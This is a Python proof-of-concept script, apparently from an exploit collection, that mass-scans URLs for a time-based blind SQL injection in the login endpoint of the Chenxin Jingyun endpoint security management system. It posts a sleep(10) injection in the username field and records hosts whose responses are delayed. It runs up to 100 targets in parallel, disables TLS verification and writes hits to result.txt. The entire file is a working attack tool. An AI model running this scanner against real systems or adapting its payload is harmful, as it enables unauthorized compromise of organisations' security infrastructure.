import sys,argparse,requests,re
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool


def banner():
    banner = """

██████╗  █████╗ ███╗   ██╗██████╗  █████╗ 
██╔══██╗██╔══██╗████╗  ██║██╔══██╗██╔══██╗
██████╔╝███████║██╔██╗ ██║██║  ██║███████║
██╔═══╝ ██╔══██║██║╚██╗██║██║  ██║██╔══██║
██║     ██║  ██║██║ ╚████║██████╔╝██║  ██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚═╝  ╚═╝
                      author:panda
                      type:辰信景云终端安全管理系统 login存在 SQL注入漏洞
                      date:2024-09-2
                      version:1.0
   """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="辰信景云终端安全管理系统 login存在 SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please enter your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please enter your file')

    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip().replace('\n',''))
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/api/user/login"
    data = """
    captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(10))a)='\r\n
    username=123%40qq.com&password=e10adc3949ba59abbe56e057f20f883e&captcha=
    """
    headers = {
        "Content-Length": "181",
        "Accept": "application/json,text/javascript,*/*;q=0.01",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Accept-Encoding": "gzip,deflate",
        "Accept-Language": "zh-CN,zh;q=0.9",
    }
    res1 = requests.get(url=target, verify=False)
    try:
        if res1.status_code == 200:
            res2 = requests.post(url=target, verify=False)
            res3 = requests.post(url=target + payload, headers=headers, data=data, verify=False)
            time2 = res2.elapsed.total_seconds()
            time3 = res3.elapsed.total_seconds()
            if time3 - time2 >= 9 and time3 > 10:
                with open("result.txt", "a",encoding="utf-8") as f:
                    f.write(f"该{target}存在延时注入漏洞{time3 - time2}\n")
                print(f"该{target}存在延时注入漏洞{time3 - time2}")
            elif time3 < 9:
                print(f"该{target}不存在延时注入漏洞{time3 - time2}")
        else:
            print(f"该{target}存在问题，请手动测试")
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()